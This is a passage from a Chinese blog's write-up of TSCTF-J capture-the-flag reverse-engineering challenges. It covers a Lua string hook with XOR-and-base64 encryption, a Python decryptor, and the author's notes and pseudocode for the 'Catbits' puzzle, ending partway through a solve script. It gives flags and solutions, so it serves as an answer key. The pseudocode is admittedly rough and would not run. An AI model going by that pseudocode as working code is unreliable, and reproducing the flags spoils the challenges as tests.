字节)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">xor_byte</span><span class="params">(a, b)</span></span></span><br><span class="line">    <span class="keyword">local</span> result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span>, <span class="number">7</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> x = a % <span class="number">2</span></span><br><span class="line">        <span class="keyword">local</span> y = b % <span class="number">2</span></span><br><span class="line">        result = result + ((x ~ y) &lt;&lt; i)</span><br><span class="line">        a = <span class="built_in">math</span>.<span class="built_in">floor</span>(a / <span class="number">2</span>)</span><br><span class="line">        b = <span class="built_in">math</span>.<span class="built_in">floor</span>(b / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">(str, key)</span></span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, #str <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> c = <span class="built_in">string</span>.<span class="built_in">byte</span>(str, i)</span><br><span class="line">        c = (c + <span class="number">1</span>) % <span class="number">255</span></span><br><span class="line">        <span class="keyword">local</span> k = <span class="built_in">string</span>.<span class="built_in">byte</span>(key, (i - <span class="number">1</span>) % #key + <span class="number">1</span>)</span><br><span class="line">        result[i] = <span class="built_in">string</span>.<span class="built_in">char</span>(xor_byte(c, k))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- base64 encode</span></span><br><span class="line"><span class="keyword">local</span> b=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_encode</span><span class="params">(data)</span></span></span><br><span class="line">    <span class="keyword">return</span> ((data:<span class="built_in">gsub</span>(<span class="string">&#x27;.&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(x)</span></span></span><br><span class="line">        <span class="keyword">local</span> r,bits=<span class="string">&#x27;&#x27;</span>,<span class="built_in">string</span>.<span class="built_in">byte</span>(x)</span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">8</span>,<span class="number">1</span>,<span class="number">-1</span> <span class="keyword">do</span> r=r..(bits % <span class="number">2</span>^i - bits % <span class="number">2</span>^(i<span class="number">-1</span>) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;0&#x27;</span>) <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">end</span>)..<span class="string">&#x27;0000&#x27;</span>):<span class="built_in">gsub</span>(<span class="string">&#x27;%d%d%d?%d?%d?%d?&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(x)</span></span></span><br><span class="line">        <span class="keyword">if</span> #x &lt; <span class="number">6</span> <span class="keyword">then</span> <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> c=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">1</span>,<span class="number">6</span> <span class="keyword">do</span> c=c+(x:<span class="built_in">sub</span>(i,i)==<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">2</span>^(<span class="number">6</span>-i) <span class="keyword">or</span> <span class="number">0</span>) <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> b:<span class="built_in">sub</span>(c+<span class="number">1</span>,c+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">end</span>)..(&#123; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, <span class="string">&#x27;=&#x27;</span> &#125;)[#data % <span class="number">3</span> + <span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">(plain, key)</span></span></span><br><span class="line">    <span class="keyword">return</span> base64_encode(xor_encrypt(plain, key))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_enter</span><span class="params">(args)</span></span></span><br><span class="line">    <span class="keyword">local</span> strobj = args[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">local</span> str = getJavaStringContent(strobj)</span><br><span class="line">    <span class="keyword">local</span> encrypted = encrypt(str, <span class="string">&quot;W0WY0U4R3S0G00D2F1NDTH3K3Y&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> e1 = createJavaString(strobj, encrypted)</span><br><span class="line">    args[<span class="number">1</span>] = e1</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>, args, <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">FAKE_B64 = <span class="string">&quot;AmQTDHd7fy5CIAQyRUokVD1RJ3VlJFM4WTE+CBcn&quot;</span></span><br><span class="line">KEY = <span class="string">b&quot;W0WY0U4R3S0G00D2F1NDTH3K3Y&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_byte</span>(<span class="params">a, b</span>):</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r |= ((a &amp; <span class="number">1</span>) ^ (b &amp; <span class="number">1</span>)) &lt;&lt; i</span><br><span class="line">        a &gt;&gt;= <span class="number">1</span></span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">fake_b64, key_bytes</span>):</span><br><span class="line">    cipher = base64.b64decode(fake_b64)</span><br><span class="line">    plain = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher):</span><br><span class="line">        k = key_bytes[i % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        t = xor_byte(c, k)</span><br><span class="line">        p = (t - <span class="number">1</span>) % <span class="number">255</span>  <span class="comment"># 逆向 “加 1 再取模 255” 的操作</span></span><br><span class="line">        plain.append(p)</span><br><span class="line">    <span class="keyword">return</span> plain.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    real_flag = decrypt(FAKE_B64, KEY)</span><br><span class="line">    <span class="built_in">print</span>(real_flag)</span><br></pre></td></tr></table></figure><p>TSCTF-J{pr3tty_ez_h00k_righ7?}</p><h3 id="Catbits"><a href="#Catbits" class="headerlink" title="Catbits"></a>Catbits</h3><p>第二天上了一上午一下午的课，看了下思路偏了</p><p>解压出来有个json</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173158574.png" alt="image-20251013173158574"></p><p>纯手搓了一下午，分析对象之间的调用关系，还真给我分析出来了</p><p>有个nibble swap：((x &amp; 0xF) &lt;&lt; 4) | ((x &gt;&gt; 4) &amp; 0xF)</p><p>arc_bravo[i] &#x3D; after_charlie[i] XOR arc_bravo[i-1]</p><p>和idx[i] &#x3D; arc_bravo[i] - (i+1)</p><p>可能有个索引表qrazybox</p><p>最后写了个解密算法</p><p>出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;F`&#x27;*catcatPL~3` catcatcatcatJ catcat!*H&#125;</span><br></pre></td></tr></table></figure><p>包错的，第二天晚上突然看了下，发现</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173525557.png" alt="image-20251013173525557"></p><p>每个角色都能点……</p><p>根本不用分析json T.T</p><p>这题其实就注意广播就行，还有细心点</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013174639309.png" alt="image-20251013174639309"></p><p>第三天做，感觉半小时能搞定结果，搞了四五个小时…</p><p>因为死活找不到Toko</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173648870.png" alt="image-20251013173648870"></p><p>在这找到了最后</p><p>整理下逻辑</p><p>写了个超级伪代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">orc = []</span><br><span class="line">src = [<span class="number">211</span>,<span class="number">71</span>,<span class="number">210</span>,<span class="number">132</span>,<span class="number">193</span>,<span class="number">114</span>,<span class="number">244</span>,<span class="number">208</span>,<span class="number">213</span>,<span class="number">99</span>,<span class="number">37</span>,<span class="number">214</span>,<span class="number">224</span>,<span class="number">101</span>,<span class="number">98</span>,<span class="number">212</span>,<span class="number">224</span>,<span class="number">118</span>] <span class="comment">#从1开始</span></span><br><span class="line">arc = [] <span class="comment"># 长度为实际存储的 + 1，从1 开始</span></span><br><span class="line"><span class="comment"># 输入的往列表orc里存，从1开始</span></span><br><span class="line"><span class="comment"># 初始化arc</span></span><br><span class="line"><span class="comment"># 循环 arc</span></span><br><span class="line">qrazybox = [<span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">ind3x = <span class="number">1</span></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line">arc[<span class="number">0</span>] = <span class="number">114</span></span><br><span class="line">orc = <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> ind3x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(orc) + <span class="number">1</span>):</span><br><span class="line">    t1 = <span class="number">0</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> t1 = <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> qrazybox[index] = orc[ind3x]:</span><br><span class="line">            t1 = <span class="number">1</span></span><br><span class="line">            ret = index</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index &gt; <span class="built_in">len</span>(qrazybox):</span><br><span class="line">            ret = ???</span><br><span class="line">            t1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ret !=???:</span><br><span class="line">        arc.append[ret]</span><br><span class="line">        orc[ind3x] = qrazybox[ret]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ar = ?</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line"></span><br><span class="line">ar = ind3x</span><br><span class="line">inde3x = <span class="number">1</span></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    b1 = arc[i]</span><br><span class="line">    k = b1 + i</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">255</span>:</span><br><span class="line">        bm = k - <span class="number">255</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bm = k</span><br><span class="line">    arc[i] = bm</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    cr = <span class="number">0</span></span><br><span class="line">    c1 = 四舍五入(arc[i])</span><br><span class="line">    c2 = 四舍五入(arc[i - <span class="number">1</span>])</span><br><span class="line">    c5 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> c1 == <span class="number">0</span> &amp;&amp; c2 ==<span class="number">0</span>:</span><br><span class="line">        c3 = c1除以<span class="number">2</span>的余数</span><br><span class="line">        c4 = c2除以<span class="number">2</span>的余数</span><br><span class="line">        c6 = (c3 + c4) 除以<span class="number">2</span>的余数</span><br><span class="line">        cr = cr + c5 * c6</span><br><span class="line">        c1 = 向下取整(c1/<span class="number">2</span>)</span><br><span class="line">        c2 = 向下取整(c2/<span class="number">2</span>)</span><br><span class="line">        c5 = c5 * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    arc[i] = cr</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    deltaa = 四舍五入(arc[i])</span><br><span class="line">    deltab = (deltaa除以<span class="number">16</span>的余数)</span><br><span class="line">    deltac = deltab * <span class="number">16</span></span><br><span class="line">    delta_ret = deltac</span><br><span class="line">    ea = 四舍五入(arc[i])</span><br><span class="line">    ei = (ea除以<span class="number">16</span>的余数)</span><br><span class="line">    eu = ea - ei</span><br><span class="line">    ee = 向下取整(eu/<span class="number">16</span>)</span><br><span class="line">    e_ret = ee</span><br><span class="line">    f1 = delta_ret</span><br><span class="line">    f2 = e_ret</span><br><span class="line">    cha_ret = <span class="number">0</span></span><br><span class="line">    cha1 = 四舍五入(f1)</span><br><span class="line">    cha2 = 四舍五入(f2)</span><br><span class="line">    cha5 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> cha1 == <span class="number">0</span> &amp;&amp; cha2 ==<span class="number">0</span>:</span><br><span class="line">        cha3 = cha1除以<span class="number">2</span>的余数</span><br><span class="line">        cha4 = cha2除以<span class="number">2</span>的余数</span><br><span class="line">        <span class="keyword">if</span> cha3 ==<span class="number">1</span> 或 cha4 == <span class="number">1</span>:</span><br><span class="line">            cha6 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cha6 = <span class="number">0</span></span><br><span class="line">        char = char + cha5 * cha6</span><br><span class="line">        cha1 = 向下取整(cha1/<span class="number">2</span>)</span><br><span class="line">        cha2 = 向下取整(cha2/<span class="number">2</span>)</span><br><span class="line">        cha5 = cha5 * <span class="number">2</span></span><br><span class="line">    arc[i] = char</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(src) != <span class="built_in">len</span>(arc) -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> arc[i] != src[i - <span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你过关&quot;</span>)</span><br></pre></td></tr></table></figure><p>跟之前的json对照了下得到主逻辑，挺简单的差不多</p><p>结果又卡住了</p><p>没有注意到初始值是2</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173921845.png" alt="image-20251013173921845"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">src = [<span class="number">211</span>, <span class="number">71</span>, <span class="number">210</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">114</span>, <span class="number">244</span>, <span class="number">208</span>, <span class="number">213</span>, <span class="number">99</span>, <span class="number">37</span>, <span class="number">214</span>, <span class="number">224</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">212</span>, <span class="number">224</span>, <span class="number">118</span>]</span><br><span class="line"></span><br><span class="line">qrazy = [<span class="string">&#x27;catcat&#x27;</span>] * <span class="number">32</span> + [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span 